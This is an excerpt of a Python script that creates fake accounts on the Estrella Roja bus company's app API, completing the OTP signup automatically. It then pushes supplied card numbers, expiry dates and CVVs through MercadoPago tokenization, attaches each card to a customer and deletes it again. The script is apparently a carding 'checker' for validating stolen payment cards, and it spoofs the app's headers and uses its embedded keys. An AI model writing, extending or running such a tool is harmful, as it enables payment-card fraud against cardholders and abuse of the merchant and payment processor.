...
def _fake_profile() -> types.SimpleNamespace:
    ...
    return types.SimpleNamespace(
        f_name    = fn,  l_name = ln,
        card_name = f'{slug} {fn[:2].upper()}{ln[:2].upper()}',
        mail      = f'{fn.lower()}{random.randint(10, 999)}@{random.choice(_EMAIL_DOMS)}',
...
def _register_account(model: curl.Session) -> str:
    ...
    hdrs     = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*',
                'Authorization': _REG_AUTH, 'Content-Type': 'application/json',
                'Origin': 'https://localhost', 'X-Requested-With': 'com.estrellaroja.aeropuerto',
                'Referer': 'https://localhost/', 'Accept-Language': 'en-US,en;q=0.9'}

    r1  = model.post(f'{_AUTH_URL}/signup', headers=hdrs, json={
        'apiKey': _API_KEY, 'age': 18, 'name': random.choice(_NAMES),
        'lastname': random.choice(_LASTNAMES), 'motherlastname': random.choice(_LASTNAMES),
        'email': email, 'username': email, 'phone': phone, 'zipCode': '',
        'gender': '', 'birthday': '2000-01-15T00:00:00.000Z', 'birthDay': '2000-01-15T00:00:00.000Z',
        'password': pass_b64, 'confirm_password': pass_b64, 'secret': pass_b64,
        'terminos': True, 'canalVenta': 'PLATAFORMA_DIGITAL',
    }, timeout=15)
    otp = r1.json().get('code') if r1.status_code == 200 else None
    if not otp:
        raise Exception(f'Signup falló ({r1.status_code}): {r1.text[:80]}')

    r2 = model.post(f'{_AUTH_URL}/signup/confirm', headers=hdrs,
                    json={'apiKey': _API_KEY, 'code': otp}, timeout=15)
    if r2.status_code != 200:
        raise Exception(f'OTP confirm falló ({r2.status_code})')

    r3    = model.post(f'{_AUTH_URL}/token/access', headers=hdrs,
                       json={'apiKey': _API_KEY, 'refreshToken': '', 'secret': pass_b64, 'username': email}, timeout=15)
...
def _flow(num, mes, ano, cvv, retries: int = 0) -> dict:
    ...
    try:
        ...
        headers1 = {'Host': 'api.mercadopago.com', 'Accept': '*/*',
                    'Content-Type': 'application/json', 'X-Product-Id': 'C6N36C9L2KK4U8V6P7J0',
                    'Origin': 'https://secure-fields.mercadopago.com',
                    'X-Requested-With': 'com.estrellaroja.aeropuerto',
                    'Referer': 'https://secure-fields.mercadopago.com/'}
        payload1 = {'card_number': num, 'cardholder': {'name': data.card_name, 'identification': {}},
                    'security_code': cvv, 'expiration_month': mes, 'expiration_year': ano,
                    'device': {'meli': {'session_id': sid}}}
        request1 = model.post(
            f'https://api.mercadopago.com/v1/card_tokens?public_key={_MP_KEY}&locale=es-MX&js_version=2.60.5&referer=https%3A%2F%2Ferbridge-app.web.app',
            headers=headers1, json=payload1, timeout=15)
        mp_j   = request1.json()
        mp_tok = mp_j.get('id')
        ...
        plain    = json.dumps({'customer': {'customerId': _CUSTOMER_ID, 'email': data.mail,
                                            'name': data.f_name, 'lastName': data.l_name,
                                            'phone': data.phone, 'zipCode': data.zipcode},
                               'card': {'name': f'{data.f_name} {data.l_name}', 'number': '',
                                        'securityCode': '', 'token': mp_tok}})
        headers2 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*',
        ...
        request2 = model.post(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards',
                              headers=headers2, json=payload2, timeout=35)
        ...
        headers3 = {'Host': 'apicloud.estrellaroja.com.mx', 'Accept': 'application/json, text/plain, */*',
                    'Authorization': f'Bearer {jwt}', 'Origin': 'https://localhost',
                    'X-Requested-With': 'com.estrellaroja.aeropuerto'}
        request3    = model.get(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards?servicioId={_SERVICE_ID}&clientId={_CUSTOMER_ID}',
        ...
        request4 = model.delete(f'{_SITE_URL}/siverpd/api/v1/payment/customer-cards/{card_token}',
                                headers=headers3, timeout=15) if card_token else None
